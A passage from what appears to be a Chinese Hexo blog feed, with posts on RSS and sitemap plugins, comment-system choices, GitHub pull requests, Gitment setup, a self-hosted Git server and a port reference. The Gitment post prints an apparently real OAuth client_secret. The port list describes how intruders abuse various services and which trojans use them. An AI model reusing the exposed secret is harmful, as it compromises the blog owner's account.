<h3 id="2-配置根目录-config-yml"><a href="#2-配置根目录-config-yml" class="headerlink" title="2.配置根目录_config.yml"></a>2.配置根目录_config.yml</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: http://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">#RSS订阅</span></span><br><span class="line"><span class="attr">plugin:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo-generator-feed</span></span><br><span class="line"><span class="comment">#Feed Atom</span></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">atom</span></span><br><span class="line"><span class="attr">path:</span> <span class="string">atom.xml</span></span><br><span class="line"><span class="attr">limit:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure>
<h3 id="3-验证配置是否成功"><a href="#3-验证配置是否成功" class="headerlink" title="3.验证配置是否成功"></a>3.验证配置是否成功</h3><p>执行 <code>hexo g</code>，查看一下public目录下，如果有 <code>atom.xml</code> 文件，则表明配置成功。</p>
<h3 id="4-显示RSS图标"><a href="#4-显示RSS图标" class="headerlink" title="4.显示RSS图标"></a>4.显示RSS图标</h3><p>这里以3-hexo主题为例，给rss添加链接<code>/atom.xml</code>修改<code>/themes/3-hexo/_config.yml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">link:</span><br><span class="line">  rss: /atom.xml</span><br></pre></td></tr></table></figure>
<h3 id="5-效果"><a href="#5-效果" class="headerlink" title="5.效果"></a>5.效果</h3><p><strong>链接图标：</strong><br><img src="http://img.saodiyang.com/FlmC3WWi9jzgVRdSKJ2_li5UHVsr.png" class="lazyload" data-srcset="http://img.saodiyang.com/FlmC3WWi9jzgVRdSKJ2_li5UHVsr.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="图标"><br><strong>链接地址效果</strong><br><img src="http://img.saodiyang.com/FuTy1C-xSgdTTOZch_UH1355NAs9.png" class="lazyload" data-srcset="http://img.saodiyang.com/FuTy1C-xSgdTTOZch_UH1355NAs9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="效果"></p>
<h2 id="添加Sitemap"><a href="#添加Sitemap" class="headerlink" title="添加Sitemap"></a>添加Sitemap</h2><p>Sitemap，网站地图，是网站优化中重要的一环，无论是对于访问者还是对于搜索引擎。</p>
<h3 id="1-用npm安装插件-1"><a href="#1-用npm安装插件-1" class="headerlink" title="1.用npm安装插件"></a>1.用<code>npm</code>安装插件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>
<h3 id="2-配置根目录-config-yml-1"><a href="#2-配置根目录-config-yml-1" class="headerlink" title="2.配置根目录_config.yml"></a>2.配置根目录_config.yml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">plugin:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line">- hexo-generator-sitemap</span><br></pre></td></tr></table></figure>
<h3 id="3-验证配置是否成功-1"><a href="#3-验证配置是否成功-1" class="headerlink" title="3.验证配置是否成功"></a>3.验证配置是否成功</h3><p>执行 <code>hexo g</code>，查看一下public目录下，如果有 <code>sitemap.xml</code> 文件，则表明配置成功。</p>
<h3 id="4-效果"><a href="#4-效果" class="headerlink" title="4.效果"></a>4.效果</h3><p>访问 /sitemap.xml 就能看到生成的站点地图了<br><img src="http://img.saodiyang.com/FtFLZ2CSfYa_IKLS-a9ymvKvaztp.png" class="lazyload" data-srcset="http://img.saodiyang.com/FtFLZ2CSfYa_IKLS-a9ymvKvaztp.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="站点地图效果"></p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>关于第三方评论系统</title>
    <url>//the-third-comment</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天登陆blog看到了多说的通知：将于2017年6月1日正式关停服务，其实并没有太大的意外。</p>
<p>自从去年9月份disqus被GFW认证后，被迫转移到多说，一看就是很久没有维护了，感觉关闭就是迟早的事，没想到刚用5个月。。</p>
<p><img src="http://img.saodiyang.com/FiTeQPGuPt1W5BuUj2NcruE_eHkv.jpg" class="lazyload" data-srcset="http://img.saodiyang.com/FiTeQPGuPt1W5BuUj2NcruE_eHkv.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="好想使用disqus啊！！！"></p>
<p>不能用disqus不开心，然后就又开始调查第三方评论系统。</p>
<h2 id="友言"><a href="#友言" class="headerlink" title="友言"></a>友言</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
<li>界面挺像disqus的</li>
<li>查询最近的评论，需要打开新的页面</li>
<li>支持表情，不支持图片</li>
<li>支持自定义界面</li>
<li>注册即用</li>
</ol>
<p><img src="http://img.saodiyang.com/Fu3w7t5F_blvaZ2xyRmNaZ70wDJD.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fu3w7t5F_blvaZ2xyRmNaZ70wDJD.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="友言"></p>
<h2 id="网易云跟帖"><a href="#网易云跟帖" class="headerlink" title="网易云跟帖"></a>网易云跟帖</h2><h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><ol>
<li>界面简洁</li>
<li>网易作为后台，不容易倒</li>
<li>不支持表情，不支持图片</li>
<li>支持自定义界面</li>
<li>我在国外加载巨慢，不过查了国内的延迟，平均20ms左右。</li>
<li>注册即用</li>
</ol>
<p><img src="http://img.saodiyang.com/Fhb1TtKq7JWIj91gU90Mh4o5Ay12.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fhb1TtKq7JWIj91gU90Mh4o5Ay12.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="网易云跟帖"></p>
<h2 id="畅言"><a href="#畅言" class="headerlink" title="畅言"></a>畅言</h2><h3 id="特点-2"><a href="#特点-2" class="headerlink" title="特点"></a>特点</h3><ol>
<li>界面简介</li>
<li>打印记的功能</li>
<li>支持表情和图片</li>
<li>支持获取评论数</li>
<li>需要ICP备案</li>
</ol>
<p><img src="http://img.saodiyang.com/FufklpIz5UFXJsiKGGjTP9DnMymz.png" class="lazyload" data-srcset="http://img.saodiyang.com/FufklpIz5UFXJsiKGGjTP9DnMymz.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="畅言"></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>想要尝试一下畅言，功能符合我的预期，不过要ICP备案，最近由于想要开启国内CDN加速，也需要备案。</p>
<p><code>蛋四！！</code> 我在国外，等回国的时候再备案吧，暂时现使用 <code>disqus</code>,如果想评论，国内只能翻墙了。╮（╯＿╰）╭</p>
<p>最后，多说一路走好。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>如何给GitHub上的项目贡献代码</title>
    <url>//contributing-to-open-source-on-github</url>
    <content><![CDATA[<p>最近一直在使用 <code>hexo</code> 的一款主题 <code>yelee</code> ，但是发现它的代码块由于空行不占位导致的显示错位，所以就去GitHub上翻issue，果然有好多人都在反映这个问题，并且作者已经打上bug标签，事情应该就马上结束了，就去忙别的了。这两天又去逛了一下issue，发现这个bug仍然屹立在那里，强迫症又犯了，趁着今天工作不怎么忙，就把这个bug解决了。然后问题来了，怎么才能给作者贡献代码呢。</p>
<span id="more"></span>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
<li>首先通过 <code>git clone</code> 将项目克隆到本地（我早已拉下来，跳过此步骤）</li>
<li><code>git pull</code> 拉取最新代码（将所有的change都同步到本地）</li>
<li>将 原项目 <code>fork</code> 到 自己的github上,并复制代码url</li>
<li>在本地添加第二个仓库地址：<code>git remote add [nickname] [your url]</code></li>
</ol>
<h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><ol>
<li>修改bug 或 新增功能</li>
<li><code>git commit [file1] [file2] ... -m [message]</code> 本地提交代码</li>
</ol>
<h2 id="同步到github中并发到原项目"><a href="#同步到github中并发到原项目" class="headerlink" title="同步到github中并发到原项目"></a>同步到github中并发到原项目</h2><ol>
<li><code>git push [nickname]</code> 将代码 push 到自己的项目里，nickname就是添加的第二个仓库的名字</li>
<li>自己项目内，点击 pull requests -》 new pull request 将本次修改提交到原项目进行同步。</li>
</ol>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title>完美替代多说-gitment</title>
    <url>//gitment</url>
    <content><![CDATA[<p>自从多说要停止服务时，就开始关注第三方评论系统，现在的评论系统都有这样或那样的问题，见 <a href="#">Post not found: the-third-comment</a> 。忽然看到作者 孙士权 的一片文章 <a href="https://imsun.net/posts/gitment-introduction/">Gitment：使用 GitHub Issues 搭建评论系统</a> 。</p>
<p>立即就将 <code>gitment</code> 集成到 <code>3-hexo</code> 主题内。本篇文章只讲在 <code>3-hexo</code> 内如何使用，如果想自定义，可以参考上面原文。</p>
<h2 id="注册-OAuth-Application"><a href="#注册-OAuth-Application" class="headerlink" title="注册 OAuth Application"></a>注册 OAuth Application</h2><p><a href="https://github.com/settings/applications/new">点击此处</a> 来注册一个新的 OAuth Application。其他内容可以随意填写，但要确保填入正确的 callback URL（一般是评论页面对应的域名，如 <a href="http://yelog.org)./">http://yelog.org）。</a><br><img src="http://img.saodiyang.com/FsumVHpCC4h5JxRNg0TiKlMf0b1Y.png" class="lazyload" data-srcset="http://img.saodiyang.com/FsumVHpCC4h5JxRNg0TiKlMf0b1Y.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="作者是这样填的"></p>
<h2 id="使用-gitment-评论系统"><a href="#使用-gitment-评论系统" class="headerlink" title="使用 gitment 评论系统"></a>使用 gitment 评论系统</h2><p>修改主题 <code>_config.yml</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">gitment:</span><br><span class="line">  on: true  # 启用gitment评论系统</span><br><span class="line">  owner: yelog  # 你的github账号</span><br><span class="line">  repo: yelog.github.io  # 评论issue保存的仓库，我选择保存在blog仓库，也可以新建一个仓库</span><br><span class="line">  client_id: d64ceca0d8a4e8b1f5c9   # 上一步注册后生成的client_id</span><br><span class="line">  client_secret: fb17d5f0aba31372f61a03df707bb20a39a73a06 # 上一步注册后生成的client_secret</span><br></pre></td></tr></table></figure>

<h2 id="部署并初始化"><a href="#部署并初始化" class="headerlink" title="部署并初始化"></a>部署并初始化</h2><p>1.发布 hexo</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clear &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
<p>2.打开发布的blog，登录github账号，并点击 <code>Initialize Comments</code>。<br><img src="http://img.saodiyang.com/FnO9sHY-eFVXwnLplwsP9NRvityH.png" class="lazyload" data-srcset="http://img.saodiyang.com/FnO9sHY-eFVXwnLplwsP9NRvityH.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="初始化本页的评论"></p>
<p>3.现在其他人就可以进行评论了</p>
<h2 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h2><p>整体评论系统做的简洁，整体来说是个不错的系统。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建Git服务器</title>
    <url>//set-up-git-server-on-vps</url>
    <content><![CDATA[<p>最近由于准备在公司的服务器上面搭建静态博客（Hexo），然后需要先搭建一个git服务器作为转接，整个过程看似顺利，十几分钟就搭建完成，不过最后在验证这块卡了两个小时，在此记录下来，供准备搭建git服务器的新手小伙伴们借鉴。</p>
<span id="more"></span>
<h2 id="搭建git服务器"><a href="#搭建git服务器" class="headerlink" title="搭建git服务器"></a>搭建git服务器</h2><p>通过ssh链接到服务器，开始进行操作</p>
<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>在服务器上安装 git</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get install git</span><br></pre></td></tr></table></figure>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>创建 git 用户，用来运行git服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo adduser git</span><br></pre></td></tr></table></figure>
<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>创建证书，免密码登录：<br>收集所有需要登录的用户的公钥（<code>id_rsa.pub</code>）文件，把所有公钥导入到 <code>/home/git/.ssh/authorized_keys</code> 文件内，一行一个。<br>如果个人的git中的公钥已经连接了其他服务器如：github，可以参考 <a href="#">Post not found: computer-mutiple-github-account</a></p>
<blockquote>
<p><strong>注意：一定要通过下面的命令将该文件其他用户的所有权限移除，否则会出现文章尾部问题</strong></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>
<h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p>初始化git仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git init --bare test.git</span><br></pre></td></tr></table></figure>
<p>git创建一个裸仓库，裸仓库没有工作区，因为服务器上的git仓库纯粹为了共享，所有不能让用户直接登录到服务器上去改工作区，并且服务器的git仓库通常以 <code>.git</code> 结尾。然后，修改owner改为git：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo chown -R git:git test.git</span><br></pre></td></tr></table></figure>
<h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>禁用shell登录：<br>处于安全的考虑，第二步创建的git用户不允许登录shell，这可以通过编辑 <code>/etc/passwd</code> 文件完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git:x:1003:1003::/home/git:/bin/bash</span><br></pre></td></tr></table></figure>
<p>改为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git:x:1003:1003::/home/git:/usr/bin/git-shell</span><br></pre></td></tr></table></figure>
<p>这样，git用户可以正常通过ssh使用git，但无法登录shell，因为我们为git用户指定的git-shell每次一登录就自动退出。</p>
<h3 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h3><p>克隆远程仓库：<br>现在，可以通过git clone命令克隆远程仓库了，在各自的电脑上运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@server:/home/git/test.git</span><br></pre></td></tr></table></figure>
<p>如果服务器的ssh端口不是默认的22的话，比如说6789，可以这样写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> ssh://git@server:6789/home/git/test.git</span><br></pre></td></tr></table></figure>
<h2 id="问题来了"><a href="#问题来了" class="headerlink" title="问题来了"></a>问题来了</h2><p>本来根据文档，根据广大猿友的经验，我的搭建之路已经完成了，然后最后一步出现了问题。每次跟服务器进行交互(clone,pull,push)，都让我输入git的密码，也就是说，我配置的ssh没有生效。然后就开始到处找原因，重新生成rsa，提升authorized_keys权限，重新创建服务器git账户，重新。。。。。</p>
<p>翻遍了 Stack Overflow 和 segmentfault ,两个小时过去了，问题仍然没有进展，这么简单的东西，问题到底出在哪里。</p>
<p>就在心灰意冷，准备放弃的时候，不知道是哪里来的灵感，准备把 authorized_keys 文件的其他用户的权限删掉，然后就能用了，后就能用了，就能用了，能用了，用了，了～～～～，命令如下，不想多说话，我想静静。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ chmod 600 authorized_keys</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器常用端口一览</title>
    <url>//%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E4%B8%80%E8%A7%88</url>
    <content><![CDATA[<h1 id="Windows-端口和所提供的服务"><a href="#Windows-端口和所提供的服务" class="headerlink" title="Windows 端口和所提供的服务"></a><a href="https://www.cnblogs.com/yunweis/p/8037653.html">Windows 端口和所提供的服务</a></h1><h2 id="一-、端口大全"><a href="#一-、端口大全" class="headerlink" title="一 、端口大全"></a>一 、端口大全</h2><p>端口：0<br>服务：Reserved<br>说明：通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用通常的闭合端口连接它时将产生不同的结果。一种典型的扫描，使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。</p>
<p>端口：1<br>服务：tcpmux<br>说明：这显示有人在寻找SGI Irix机器。Irix是实现tcpmux的主要提供者，默认情况下tcpmux在这种系统中被打开。Irix机器在发布是含有几个默认的无密码的帐户，如：IP、GUEST UUCP、NUUCP、DEMOS 、TUTOR、DIAG、OUTOFBOX等。许多管理员在安装后忘记删除这些帐户。因此HACKER在INTERNET上搜索tcpmux并利用这些帐户。</p>
<p>端口：7<br>服务：Echo<br>说明：能看到许多人搜索Fraggle放大器时，发送到X.X.X.0和X.X.X.255的信息。</p>
<p>端口：19<br>服务：Character Generator<br>说明：这是一种仅仅发送字符的服务。UDP版本将会在收到UDP包后回应含有垃圾字符的包。TCP连接时会发送含有垃圾字符的数据流直到连接关闭。HACKER利用IP欺骗可以发动DoS攻击。伪造两个chargen服务器之间的UDP包。同样Fraggle DoS攻击向目标地址的这个端口广播一个带有伪造受害者IP的数据包，受害者为了回应这些数据而过载。</p>
<p>端口：21<br>服务：FTP<br>说明：FTP服务器所开放的端口，用于上传、下载。最常见的攻击者用于寻找打开anonymous的FTP服务器的方法。这些服务器带有可读写的目录。木马Doly Trojan、Fore、Invisible FTP、WebEx、WinCrash和Blade Runner所开放的端口。</p>
<p>端口：22<br>服务：Ssh<br>说明：PcAnywhere建立的TCP和这一端口的连接可能是为了寻找ssh。这一服务有许多弱点，如果配置成特定的模式，许多使用RSAREF库的版本就会有不少的漏洞存在。</p>
<p>端口：23<br>服务：Telnet<br>说明：远程登录，入侵者在搜索远程登录UNIX的服务。大多数情况下扫描这一端口是为了找到机器运行的操作系统。还有使用其他技术，入侵者也会找到密码。木马Tiny Telnet Server就开放这个端口。</p>
<p>端口：25<br>服务：SMTP<br>说明：SMTP服务器所开放的端口，用于发送邮件。入侵者寻找SMTP服务器是为了传递他们的SPAM。入侵者的帐户被关闭，他们需要连接到高带宽的E-MAIL服务器上，将简单的信息传递到不同的地址。木马Antigen、Email Password Sender、Haebu Coceda、Shtrilitz Stealth、WinPC、WinSpy都开放这个端口。</p>
<p>端口：31<br>服务：MSG Authentication<br>说明：木马Master Paradise、Hackers Paradise开放此端口。</p>
<p>端口：42<br>服务：WINS Replication<br>说明：WINS复制</p>
<p>端口：53<br>服务：Domain Name Server（DNS）<br>说明：DNS服务器所开放的端口，入侵者可能是试图进行区域传递（TCP），欺骗DNS（UDP）或隐藏其他的通信。因此_blank”&gt;防火墙常常过滤或记录此端口。</p>
<p>端口：67<br>服务：Bootstrap Protocol Server<br>说明：通过DSL和Cable modem的_blank”&gt;防火墙常会看见大量发送到广播地址255.255.255.255的数据。这些机器在向DHCP服务器请求一个地址。 HACKER常进入它们，分配一个地址把自己作为局部路由器而发起大量中间人（man-in-middle）攻击。客户端向68端口广播请求配置，服务器向67端口广播回应请求。这种回应使用广播是因为客户端还不知道可以发送的IP地址。</p>
<p>端口：69<br>服务：Trival File Transfer<br>说明：许多服务器与bootp一起提供这项服务，便于从系统下载启动代码。但是它们常常由于错误配置而使入侵者能从系统中窃取任何 文件。它们也可用于系统写入文件。</p>
<p>端口：79<br>服务：Finger Server<br>说明：入侵者用于获得用户信息，查询操作系统，探测已知的缓冲区溢出错误，回应从自己机器到其他机器Finger扫描。</p>
<p>端口：80<br>服务：HTTP<br>说明：用于网页浏览。木马Executor开放此端口。</p>
<p>端口：99<br>服务：Metagram Relay<br>说明：后门程序ncx99开放此端口。</p>
<p>端口：102<br>服务：Message transfer agent(MTA)-X.400 over TCP/IP<br>说明：消息传输代理。</p>
<p>端口：109<br>服务：Post Office Protocol -Version3<br>说明：POP3服务器开放此端口，用于接收邮件，客户端访问服务器端的邮件服务。POP3服务有许多公认的弱点。关于用户名和密码交 换缓冲区溢出的弱点至少有20个，这意味着入侵者可以在真正登陆前进入系统。成功登陆后还有其他缓冲区溢出错误。</p>
<p>端口：110<br>服务：SUN公司的RPC服务所有端口<br>说明：常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd等</p>
<p>端口：113<br>服务：Authentication Service<br>说明：这是一个许多计算机上运行的协议，用于鉴别TCP连接的用户。使用标准的这种服务可以获得许多计算机的信息。但是它可作为许多服务的记录器，尤其是FTP、POP、IMAP、SMTP和IRC等服务。通常如果有许多客户通过_blank”&gt;防火墙访问这些服务，将会看到许多这个端口的连接请求。记住，如果阻断这个端口客户端会感觉到在_blank”&gt;防火墙另一边与E-MAIL服务器的缓慢连接。许多_blank”&gt;防火墙支持TCP连接的阻断过程中发回RST。这将会停止缓慢的连接。</p>
<p>端口：119<br>服务：Network News Transfer Protocol<br>说明：NEWS新闻组传输协议，承载USENET通信。这个端口的连接通常是人们在寻找USENET服务器。多数ISP限制，只有他们的客户才能访问他们的新闻组服务器。打开新闻组服务器将允许发/读任何人的帖子，访问被限制的新闻组服务器，匿名发帖或发送SPAM。</p>
<p>端口：135<br>服务：Location Service<br>说明：Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。这与UNIX 111端口的功能很相似。使用DCOM和RPC的服务利用计算机上的end-point mapper注册它们的位置。远端客户连接到计算机时，它们查找end-point mapper找到服务的位置。HACKER扫描计算机的这个端口是为了找到这个计算机上运行Exchange Server吗？什么版本？还有些DOS攻击直接针对这个端口。</p>
<p>端口：137、138、139<br>服务：NETBIOS Name Service<br>说明：其中137、138是UDP端口，当通过网上邻居传输文件时用这个端口。而139端口：通过这个端口进入的连接试图获得NetBIOS/SMB服务。这个协议被用于windows文件和打印机共享和SAMBA。还有WINS Regisrtation也用它。</p>
<p>端口：143<br>服务：Interim Mail Access Protocol v2<br>说明：和POP3的安全问题一样，许多IMAP服务器存在有缓冲区溢出漏洞。记住：一种LINUX蠕虫（admv0rm）会通过这个端口繁殖，因此许多这个端口的扫描来自不知情的已经被感染的用户。当REDHAT在他们的LINUX发布版本中默认允许IMAP后，这些漏洞变的很流行。这一端口还被用于IMAP2，但并不流行。</p>
<p>端口：161<br>服务：SNMP<br>说明：SNMP允许远程管理设备。所有配置和运行信息的储存在数据库中，通过SNMP可获得这些信息。许多管理员的错误配置将被暴露在 Internet。Cackers将试图使用默认的密码public、private访问系统。他们可能会试验所有可能的组合。SNMP包可能会被错误的指向用户的网络。</p>
<p>端口：177<br>服务：X Display Manager Control Protocol<br>说明：许多入侵者通过它访问X-windows操作台，它同时需要打开6000端口。</p>
<p>端口：389<br>服务：LDAP、ILS<br>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</p>
<p>端口：443<br>服务：Https<br>说明：网页浏览端口，能提供加密和通过安全端口传输的另一种HTTP。</p>
<p>端口：456<br>服务：[NULL]<br>说明：木马HACKERS PARADISE开放此端口。</p>
<p>端口：513<br>服务：Login,remote login<br>说明：是从使用cable modem或DSL登陆到子网中的UNIX计算机发出的广播。这些人为入侵者进入他们的系统提供了信息。</p>
<p>端口：544<br>服务：[NULL]<br>说明：kerberos kshell</p>
<p>端口：548<br>服务：Macintosh,File Services(AFP/IP)<br>说明：Macintosh,文件服务。</p>
<p>端口：553<br>服务：CORBA IIOP （UDP）<br>说明：使用cable modem、DSL或VLAN将会看到这个端口的广播。CORBA是一种面向对象的RPC系统。入侵者可以利用这些信息进入系统。</p>
<p>端口：555<br>服务：DSF<br>说明：木马PhAse1.0、Stealth Spy、IniKiller开放此端口。</p>
<p>端口：568<br>服务：Membership DPA<br>说明：成员资格 DPA。</p>
<p>端口：569<br>服务：Membership MSN<br>说明：成员资格 MSN。</p>
<p>端口：635<br>服务：mountd<br>说明：Linux的mountd Bug。这是扫描的一个流行BUG。大多数对这个端口的扫描是基于UDP的，但是基于TCP的mountd有所增加（mountd同时运行于两个端口）。记住mountd可运行于任何端口（到底是哪个端口，需要在端口111做portmap查询），只是Linux默认端口是635，就像NFS通常运行于 2049端口。</p>
<p>端口：636<br>服务：LDAP<br>说明：SSL（Secure Sockets layer）</p>
<p>端口：666<br>服务：Doom Id Software<br>说明：木马Attack FTP、Satanz Backdoor开放此端口</p>
<p>端口：993<br>服务：IMAP<br>说明：SSL（Secure Sockets layer）</p>
<p>端口：1001、1011<br>服务：[NULL]<br>说明：木马Silencer、WebEx开放1001端口。木马Doly Trojan开放1011端口。</p>
<p>端口：1024<br>服务：Reserved<br>说明：它是动态端口的开始，许多程序并不在乎用哪个端口连接网络，它们请求系统为它们分配下一个闲置端口。基于这一点分配从端口1024开始。这就是说第一个向系统发出请求的会分配到1024端口。你可以重启机器，打开Telnet，再打开一个窗口运行natstat -a 将会看到Telnet被分配1024端口。还有SQL session也用此端口和5000端口。</p>
<p>端口：1025、1033<br>服务：1025：network blackjack 1033：[NULL]<br>说明：木马netspy开放这2个端口。</p>
<p>端口：1080<br>服务：SOCKS<br>说明：这一协议以通道方式穿过_blank”&gt;防火墙，允许_blank”&gt;防火墙后面的人通过一个IP地址访问INTERNET。理论上它应该只允许内部的通信向外到达INTERNET。但是由于错误的配置，它会允许位于_blank”&gt;防火墙外部的攻击穿过 _blank”&gt;防火墙。WinGate常会发生这种错误，在加入IRC聊天室时常会看到这种情况。</p>
<p>端口：1170<br>服务：[NULL]<br>说明：木马Streaming Audio Trojan、Psyber Stream Server、Voice开放此端口。</p>
<p>端口：1234、1243、6711、6776<br>服务：[NULL]<br>说明：木马SubSeven2.0、Ultors Trojan开放1234、6776端口。木马SubSeven1.0/1.9开放1243、6711、6776端口。</p>
<p>端口：1245<br>服务：[NULL]<br>说明：木马Vodoo开放此端口。</p>
<p>端口：1433<br>服务：SQL<br>说明：Microsoft的SQL服务开放的端口。</p>
<p>端口：1492<br>服务：stone-design-1<br>说明：木马FTP99CMP开放此端口。</p>
